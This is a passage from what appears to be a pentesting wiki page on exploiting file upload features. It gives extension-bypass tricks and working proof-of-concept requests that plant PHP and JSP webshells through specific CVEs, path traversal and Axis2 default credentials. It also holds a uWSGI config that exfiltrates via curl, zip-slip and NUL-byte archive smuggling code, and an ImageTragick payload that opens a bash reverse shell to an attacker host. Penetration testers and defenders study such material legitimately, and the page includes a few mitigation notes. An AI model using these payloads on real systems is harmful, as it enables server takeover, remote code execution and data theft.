  \ useful extensions:\n\n- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm,\
  \ .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_\n  - **Working in PHPv8**: _.php_, _.php4_, _.php5_,\
  \ _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_\n- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml,\
  \ .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_\n- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_\n-\
  \ **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_\n- **Flash**: _.swf_\n- **Perl**: _.pl, .cgi_\n- **Erlang Yaws Web Server**:\
  \ _.yaws_\n\n### Bypass file extensions checks\n\n1. If they apply, the **check** the **previous extensions.** Also test\
  \ them using some **uppercase letters**: _pHp, .pHP5, .PhAr ..._\n2. _Check **adding a valid extension before** the execution\
  \ extension (use previous extensions also):_\n   - _file.png.php_\n   - _file.png.Php5_\n3. Try adding **special characters\
  \ at the end.** You could use Burp to **bruteforce** all the **ascii** and **Unicode** characters. (_Note that you can also\
  \ try to use the **previously** motioned **extensions**_)\n   - _file.php%20_\n   - _file.php%0a_\n   - _file.php%00_\n\
  \   - _file.php%0d%0a_\n   - _file.php/_\n   - _file.php.\\\\_\n   - _file._\n   - _file.php...._\n   - _file.pHp5...._\n\
  4. Try to bypass the protections **tricking the extension parser** of the server-side with techniques like **doubling**\
  \ the **extension** or **adding junk** data (**null** bytes) between extensions. _You can also use the **previous extensions**\
  \ to prepare a better payload._\n   - _file.png.php_\n   - _file.png.pHp5_\n   - _file.php#.png_\n   - _file.php%00.png_\n\
  \   - _file.php\\x00.png_\n   - _file.php%0a.png_\n   - _file.php%0d%0a.png_\n   - _file.phpJunk123png_\n5. Add **another\
  \ layer of extensions** to the previous check:\n   - _file.png.jpg.php_\n   - _file.php%00.png%00.jpg_\n6. Try to put the\
  \ **exec extension before the valid extension** and pray so the server is misconfigured. (useful to exploit Apache misconfigurations\
  \ where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):\n   - _ex: file.php.png_\n\
  7. Using **NTFS alternate data stream (ADS)** in **Windows**. In this case, a colon character \":” will be inserted after\
  \ a forbidden extension and before a permitted one. As a result, an **empty file with the forbidden extension** will be\
  \ created on the server (e.g. \"file.asax:.jpg”). This file might be edited later using other techniques such as using its\
  \ short filename. The \"**::$data**” pattern can also be used to create non-empty files. Therefore, adding a dot character\
  \ after this pattern might also be useful to bypass further restrictions (.e.g. \"file.asp::$data.”)\n8. Try to break the\
  \ filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php\n\n   ```\n \
  \  # Linux maximum 255 bytes\n   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255\n   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4\
  \ # minus 4 here and adding .png\n   # Upload the file and check response how many characters it alllows. Let's say 236\n\
  \   python -c 'print \"A\" * 232'\n   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\
  \   # Make the payload\n   AAA<--SNIP 232 A-->AAA.php.png\n   ```\n\n#### UniSharp Laravel Filemanager pre-2.9.1 (.php.\
  \ trailing dot) – CVE-2024-21546\n\nSome upload handlers trim or normalize trailing dot characters from the saved filename.\
  \ In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation\
  \ by:\n\n- Using a valid image MIME and magic header (e.g., PNG’s `\\x89PNG\\r\\n\\x1a\\n`).\n- Naming the uploaded file\
  \ with a PHP extension followed by a dot, e.g., `shell.php.`.\n- The server strips the trailing dot and persists `shell.php`,\
  \ which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).\n\nMinimal\
  \ PoC (Burp Repeater):\n\n```http\nPOST /profile/avatar HTTP/1.1\nHost: target\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\
  \n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"upload\"; filename=\"0xdf.php.\"\nContent-Type: image/png\n\
  \n\\x89PNG\\r\\n\\x1a\\n<?php system($_GET['cmd']??'id'); ?>\n------WebKitFormBoundary--\n```\n\nThen hit the saved path\
  \ (typical in Laravel + LFM):\n\n```\nGET /storage/files/0xdf.php?cmd=id\n```\n\n### Bypass Content-Type, Magic Number,\
  \ Compression & Resizing\n\n- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header**\
  \ to: _image/png_ , _text/plain , application/octet-stream_\n  1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)\n\
  - Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_\
  \ command). Or introduce the shell inside the **metadata**:\\\n  `exiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);}\
  \ __halt_compiler();\" img.jpg`\\\n  `\\` or you could also **introduce the payload directly** in an image:\\\n  `echo '<?php\
  \ system($_REQUEST['cmd']); ?>' >> img.png`\n- If **compressions is being added to your image**, for example using some\
  \ standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful\
  \ it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)\
  \ to insert some text that will **survive compression**.\n  - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)\n\
  - The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`.\
  \ However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)\
  \ to insert some text that will **survive compression**.\n  - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)\n\
  - Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However,\
  \ you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)\
  \ to insert some text that will **survive compression**.\n  - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)\n\
  \n### Other Tricks to check\n\n- Find a vulnerability to **rename** the file already uploaded (to change the extension).\n\
  - Find a **Local File Inclusion** vulnerability to execute the backdoor.\n- **Possible Information disclosure**:\n  1. Upload\
  \ **several times** (and at the **same time**) the **same file** with the **same name**\n  2. Upload a file with the **name**\
  \ of a **file** or **folder** that **already exists**\n  3. Uploading a file with **\".\" , \"..\", or \"…\" as its name**.\
  \ For instance, in Apache in **Windows**, if the application saves the uploaded files in \"/www/uploads/\" directory, the\
  \ \".\" filename will create a file called \n  uploads” in the \"/www/\" directory.\n  4. Upload a file that may not be\
  \ deleted easily such as **\"…:.jpg\"** in **NTFS**. (Windows)\n  5. Upload a file in **Windows** with **invalid characters**\
  \ such as `|<>*?”` in its name. (Windows)\n  6. Upload a file in **Windows** using **reserved** (**forbidden**) **names**\
  \ such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6,\
  \ LPT7, LPT8, and LPT9.\n- Try also to **upload an executable** (.exe) or an **.html** (less suspicious) that **will execute\
  \ code** when accidentally opened by victim.\n\n### Special extension tricks\n\nIf you are trying to upload files to a **PHP\
  \ server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\\\
  \nIf you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).\n\
  \nThe `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php,\
  \ or including it inside a script...)\n\nThe `.inc` extension is sometimes used for php files that are only used to **import\
  \ files**, so, at some point, someone could have allow **this extension to be executed**.\n\n## **Jetty RCE**\n\nIf you\
  \ can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.**\
  \ So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!\n\n![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image\
  \ (1047).png>)\n\n## **uWSGI RCE**\n\nFor a detailed exploration of this vulnerability check the original research: [uWSGI\
  \ RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).\n\nRemote\
  \ Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini`\
  \ configuration file. uWSGI configuration files leverage a specific syntax to incorporate \"magic\" variables, placeholders,\
  \ and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among\
  \ the various supported schemes in uWSGI, the \"exec\" scheme is particularly potent, allowing the reading of data from\
  \ a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or\
  \ Arbitrary File Write/Read when a `.ini` configuration file is processed.\n\nConsider the following example of a harmful\
  \ `uwsgi.ini` file, showcasing various schemes:\n\n```ini\n[uwsgi]\n; read from a symbol\nfoo = @(sym://uwsgi_funny_function)\n\
  ; read from binary appended data\nbar = @(data://[REDACTED])\n; read from http\ntest = @(http://[REDACTED])\n; read from\
  \ a file descriptor\ncontent = @(fd://[REDACTED])\n; read from a process stdout\nbody = @(exec://whoami)\n; curl to exfil\
  \ via collaborator\nextra = @(exec://curl http://collaborator-unique-host.oastify.com)\n; call a function returning a char\
  \ *\ncharacters = @(call://uwsgi_func)\n```\n\nThe execution of the payload occurs during the parsing of the configuration\
  \ file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after\
  \ a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled,\
  \ reloads the file at specified intervals upon detecting changes.\n\nIt's crucial to understand the lax nature of uWSGI's\
  \ configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or\
  \ PDF), further broadening the scope of potential exploitation.\n\n### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)\n\
  \nUnauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping\
  \ a PHP file. Vulnerable versions: up to and including 25.0.01.\n\n- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`\n\
  - Method: POST\n- Required params:\n  - `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name,\
  \ base64-decodes the tail)\n  - `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)\n\
  \  - `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)\n\nMinimal PoC to write and read back a file:\n\
  \n```bash\n# Prepare test payload\nprintf '0xdf was here!' | base64\n# => MHhkZiB3YXMgaGVyZSEK\n\n# Write poc.php via unauth\
  \ POST\ncurl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \\\n  -d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'\n\
  \n# Verify write\ncurl http://target/Gibbon-LMS/poc.php\n```\n\nDrop a minimal webshell and execute commands:\n\n```bash\n\
  # '<?php system($_GET[\"cmd\"]); ?>' base64\n# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==\n\ncurl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php\
  \ \\\n  -d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'\n\n\
  curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'\n```\n\nNotes:\n- The handler performs `base64_decode($_POST[\"img\"\
  ])` after splitting by `;` and `,`, then writes bytes to `$absolutePath . '/' . $_POST['path']` without validating extension/type.\n\
  - Resulting code runs as the web service user (e.g., XAMPP Apache on Windows).\n\nReferences for this bug include the usd\
  \ HeroLab advisory and the NVD entry. See the References section below.\n\n## **wget File Upload/SSRF Trick**\n\nIn some\
  \ occasions you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In\
  \ these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that\
  \ only allowed files are going to be downloaded. However, **this check can be bypassed.**\\\nThe **maximum** length of a\
  \ **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download\
  \ a file called \"A\"*232+\".php\"+\".gif\"**, this filename will **bypass** the **check** (as in this example **\".gif\"\
  ** is a **valid** extension) but `wget` will **rename** the file to **\"A\"*232+\".php\"**.\n\n```bash\n#Create file and\
  \ HTTP server\necho \"SOMETHING\" > $(python -c 'print(\"A\"*(236-4)+\".php\"+\".gif\")')\npython3 -m http.server 9080\n\
  ```\n\n```bash\n#Download the file\nwget 127.0.0.1:9080/$(python -c 'print(\"A\"*(236-4)+\".php\"+\".gif\")')\nThe name\
  \ is too long, 240 chars total.\nTrying to shorten...\nNew name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.\n\
  --2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif\n\
  Connecting to 127.0.0.1:9080... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 10 [image/gif]\nSaving\
  \ to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’\n\
  \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s\n\n2020-06-13\
  \ 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’\
  \ saved [10/10]\n```\n\nNote that **another option** you may be thinking of to bypass this check is to make the **HTTP server\
  \ redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file\
  \ with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because\
  \ **wget will download the redirected page with the name of the file indicated in the original URL**.\n\n### Escaping upload\
  \ directory via NTFS junctions (Windows)\n\n(For this attack you will need local access to the Windows machine) When uploads\
  \ are stored under per-user subfolders on Windows (e.g., C:\\Windows\\Tasks\\Uploads\\<id>\\) and you control creation/deletion\
  \ of that subfolder, you can replace it with a directory junction pointing to a sensitive location (e.g., the webroot).\
  \ Subsequent uploads will be written into the target path, enabling code execution if the target interprets server‑side\
  \ code.\n\nExample flow to redirect uploads into XAMPP webroot:\n\n```cmd\n:: 1) Upload once to learn/confirm your per-user\
  \ folder name (e.g., md5 of form fields)\n::    Observe it on disk: C:\\Windows\\Tasks\\Uploads\\33d81ad509ef34a2635903babb285882\n\
  \n:: 2) Remove the created folder and create a junction to webroot\nrmdir C:\\Windows\\Tasks\\Uploads\\33d81ad509ef34a2635903babb285882\n\
  cmd /c mklink /J C:\\Windows\\Tasks\\Uploads\\33d81ad509ef34a2635903babb285882 C:\\xampp\\htdocs\n\n:: 3) Re-upload your\
  \ payload; it lands under C:\\xampp\\htdocs\n::    Minimal PHP webshell for testing\n::    <?php echo shell_exec($_REQUEST['cmd']);\
  \ ?>\n\n:: 4) Trigger\ncurl \"http://TARGET/shell.php?cmd=whoami\"\n```\n\nNotes\n- mklink /J creates an NTFS directory\
  \ junction (reparse point). The web server’s account must follow the junction and have write permission in the destination.\n\
  - This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.\n- Defenses: don’t\
  \ allow writable upload roots to be attacker‑controllable under C:\\Windows\\Tasks or similar; block junction creation;\
  \ validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.\n\n### GZIP-compressed\
  \ body upload + path traversal in destination param → JSP webshell RCE (Tomcat)\n\nSome upload/ingest handlers write the\
  \ raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports\
  \ Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with\
  \ a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s\
  \ webapps).\n\nGeneric exploitation flow:\n- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress\
  \ the bytes.\n- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file\
  \ indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is\
  \ the compressed payload.\n- Browse to the written file to trigger execution.\n\nIllustrative request:\n\n```http\nPOST\
  \ /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1\nHost: target\nContent-Type:\
  \ application/octet-stream\nContent-Encoding: gzip\nContent-Length: <len>\n\n<gzip-compressed-bytes-of-your-jsp>\n```\n\n\
  Then trigger:\n\n```http\nGET /jsp/shell.jsp?cmd=id HTTP/1.1\nHost: target\n```\n\nNotes\n- Target paths vary by install\
  \ (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP\
  \ will work.\n- Burp Suite’s Hackvertor extension can produce a correct gzip body from your payload.\n- This is a pure pre-auth\
  \ arbitrary file write → RCE pattern; it does not rely on multipart parsing.\n\nMitigations\n- Derive upload destinations\
  \ server-side; never trust path fragments from clients.\n- Canonicalize and enforce that the resolved path stays within\
  \ an allow-listed base directory.\n- Store uploads on a non-executable volume and deny script execution from writable paths.\n\
  \n### Axis2 SOAP uploadFile traversal to Tomcat webroot (JSP drop)\n\nAxis2-based upload services sometimes expose an `uploadFile`\
  \ SOAP action that takes three attacker-controlled fields: `jobDirectory` (destination directory), `archiveName` (filename),\
  \ and `dataHandler` (base64 file content). If `jobDirectory` is not canonicalized, you get arbitrary file write via path\
  \ traversal and can land a JSP in Tomcat’s webapps.\n\nMinimal request outline (default creds often work: `admin` / `trubiquity`):\n\
  \n```http\nPOST /services/WsPortalV6UpDwAxis2Impl HTTP/1.1\nHost: 127.0.0.1\nContent-Type: text/xml\n\n<soapenv:Envelope\
  \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:updw=\"http://updw.webservice.ddxPortalV6.ddxv6.procaess.com\"\
  >\n  <soapenv:Body>\n    <updw:uploadFile>\n      <updw:login>admin</updw:login>\n      <updw:password>trubiquity</updw:password>\n\
  \      <updw:archiveName>shell.jsp</updw:archiveName>\n      <updw:jobDirectory>/../../../../opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/</updw:jobDirectory>\n\
  \      <updw:dataHandler>PD8lQCBwYWdlIGltcG9ydD0iamF2YS5pby4qIjsgc3lzdGVtKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7Pz4=</updw:dataHandler>\n\
  \    </updw:uploadFile>\n  </soapenv:Body>\n</soapenv:Envelope>\n```\n\n- Bindings are often localhost-only; pair with a\
  \ full-read SSRF (absolute-URL request line, Host header ignored) to reach `127.0.0.1` if the Axis2 port isn’t exposed.\n\
  - After writing, browse to `/trufusionPortal/jsp/shell.jsp?cmd=id` to execute.\n\n## Tools\n\n- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass)\
  \ is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various\
  \ bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments\
  \ of web applications.\n\n### Corrupting upload indices with snprintf quirks (historical)\n\nSome legacy upload handlers\
  \ that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the\
  \ `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload\
  \ can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it\
  \ as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces\
  \ in CTFs and older codebases.\n\n## From File upload to other vulnerabilities\n\n- Set **filename** to `../../../tmp/lol.png`\
  \ and try to achieve a **path traversal**\n- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL\
  \ injection**\n- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS\n- Set **filename** to `; sleep\

  \ for other filetypes.\n\n## Zip/Tar File Automatically decompressed Upload\n\nIf you can upload a ZIP that is going to\
  \ be decompressed inside the server, you can do 2 things:\n\n### Symlink\n\nUpload a link containing soft links to other\
  \ files, then, accessing the decompressed files you will access the linked files:\n\n```\nln -s ../../../index.php symindex.txt\n\
  zip --symlinks test.zip symindex.txt\ntar -cvf test.tar symindex.txt\n```\n\n### Decompress in different folders\n\nThe\
  \ unexpected creation of files in directories during decompression is a significant issue. Despite initial assumptions that\
  \ this setup might guard against OS-level command execution through malicious file uploads, the hierarchical compression\
  \ support and directory traversal capabilities of the ZIP archive format can be exploited. This allows attackers to bypass\
  \ restrictions and escape secure upload directories by manipulating the decompression functionality of the targeted application.\n\
  \nAn automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc).\
  \ The utility can be used as shown:\n\n```python\n# Listing available options\npython2 evilarc.py -h\n# Creating a malicious\
  \ archive\npython2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php\n```\n\nAdditionally, the **symlink trick with evilarc**\
  \ is an option. If the objective is to target a file like `/flag.txt`, a symlink to that file should be created in your\
  \ system. This ensures that evilarc does not encounter errors during its operation.\n\nBelow is an example of Python code\
  \ used to create a malicious zip file:\n\n```python\n#!/usr/bin/python\nimport zipfile\nfrom io import BytesIO\n\n\ndef\
  \ create_zip():\n    f = BytesIO()\n    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)\n    z.writestr('../../../../../var/www/html/webserver/shell.php',\
  \ '<?php echo system($_REQUEST[\"cmd\"]); ?>')\n    z.writestr('otherfile.xml', 'Content of the file')\n    z.close()\n\
  \    zip = open('poc.zip','wb')\n    zip.write(f.getvalue())\n    zip.close()\n\ncreate_zip()\n```\n\n**Abusing compression\
  \ for file spraying**\n\nFor further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)\n\
  \n1.  **Creating a PHP Shell**: PHP code is written to execute commands passed through the `$_REQUEST` variable.\n\n   \
  \ ```php\n    <?php\n    if(isset($_REQUEST['cmd'])){\n        $cmd = ($_REQUEST['cmd']);\n        system($cmd);\n    }?>\n\
  \    ```\n\n2.  **File Spraying and Compressed File Creation**: Multiple files are created and a zip archive is assembled\
  \ containing these files.\n\n    ```bash\n    root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE\"xxA\"; cp simple-backdoor.php\
  \ $FILE\"cmd.php\";done\n    root@s2crew:/tmp# zip cmd.zip xx*.php\n    ```\n\n3.  **Modification with a Hex Editor or vi**:\
  \ The names of the files inside the zip are altered using vi or a hex editor, changing \"xxA\" to \"../\" to traverse directories.\n\
  \n    ```bash\n    :set modifiable\n    :%s/xxA/../g\n    :x!\n    ```\n\n### ZIP NUL-byte filename smuggling (PHP ZipArchive\
  \ confusion)\n\nWhen a backend validates ZIP entries using PHP’s ZipArchive but extraction writes to the filesystem using\
  \ raw names, you can smuggle a disallowed extension by inserting a NUL (0x00) into the filename fields. ZipArchive treats\
  \ the entry name as a C‑string and truncates at the first NUL; the filesystem writes the full name, dropping everything\
  \ after the NUL.\n\nHigh-level flow:\n- Prepare a legitimate container file (e.g., a valid PDF) that embeds a tiny PHP stub\
  \ in a stream so the magic/MIME stays a PDF.\n- Name it like `shell.php..pdf`, zip it, then hex‑edit the ZIP local header\
  \ and central directory filename to replace the first `.` after `.php` with `0x00`, resulting in `shell.php\\x00.pdf`.\n\
  - Validators that rely on ZipArchive will “see” `shell.php .pdf` and allow it; the extractor writes `shell.php` to disk,\
  \ leading to RCE if the upload folder is executable.\n\nMinimal PoC steps:\n```bash\n# 1) Build a polyglot PDF containing\
  \ a tiny webshell (still a valid PDF)\nprintf '%s' \"%PDF-1.3\\n1 0 obj<<>>stream\\n<?php system($_REQUEST[\"cmd\"]); ?>\\\
  nendstream\\nendobj\\n%%EOF\" > embedded.pdf\n\n# 2) Trick name and zip\ncp embedded.pdf shell.php..pdf\nzip null.zip shell.php..pdf\n\
  \n# 3) Hex-edit both the local header and central directory filename fields\n#    Replace the dot right after \".php\" with\
  \ 00 (NUL) => shell.php\\x00.pdf\n#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.\n\n# 4) Local validation behavior\n\
  php -r '$z=new ZipArchive; $z->open(\"null.zip\"); echo $z->getNameIndex(0),\"\\n\";'\n# -> shows truncated at NUL (looks\
  \ like \".pdf\" suffix)\n```\n\nNotes\n- Change BOTH filename occurrences (local and central directory). Some tools add\
  \ an extra data descriptor entry too – adjust all name fields if present.\n- The payload file must still pass server‑side\
  \ magic/MIME sniffing. Embedding the PHP in a PDF stream keeps the header valid.\n- Works where the enum/validation path\
  \ and the extraction/write path disagree on string handling.\n\n### Stacked/concatenated ZIPs (parser disagreement)\n\n\
  Concatenating two valid ZIP files produces a blob where different parsers focus on different EOCD records. Many tools locate\
  \ the last End Of Central Directory (EOCD), while some libraries (e.g., ZipArchive in specific workflows) may parse the\
  \ first archive they find. If validation enumerates the first archive and extraction uses another tool that honors the last\
  \ EOCD, a benign archive can pass checks while a malicious one gets extracted.\n\nPoC:\n```bash\n# Build two separate archives\n\
  printf test > t1; printf test2 > t2\nzip zip1.zip t1; zip zip2.zip t2\n\n# Stack them\ncat zip1.zip zip2.zip > combo.zip\n\
  \n# Different views\nunzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive\nphp -r '$z=new\
  \ ZipArchive; $z->open(\"combo.zip\"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),\"\\n\";'\n```\n\nAbuse\
  \ pattern\n- Create a benign archive (allowed type, e.g., a PDF) and a second archive containing a blocked extension (e.g.,\
  \ `shell.php`).\n- Concatenate them: `cat benign.zip evil.zip > combined.zip`.\n- If the server validates with one parser\
  \ (sees benign.zip) but extracts with another (processes evil.zip), the blocked file lands in the extraction path.\n\n##\
  \ ImageTragic\n\nUpload this content with an image extension to exploit the vulnerability **(ImageMagick , 7.0.1-1)** (form\
  \ the [exploit](https://www.exploit-db.com/exploits/39767))\n\n```\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/test.jpg\"\
  |bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch \"hello)'\npop graphic-context\n```\n\n## Embedding PHP Shell\
  \ on PNG\n\nEmbedding a PHP shell in the IDAT chunk of a PNG file can effectively bypass certain image processing operations.\
  \ The functions `imagecopyresized` and `imagecopyresampled` from PHP-GD are particularly relevant in this context, as they\
  \ are commonly used for resizing and resampling images, respectively. The ability of the embedded PHP shell to remain unaffected\
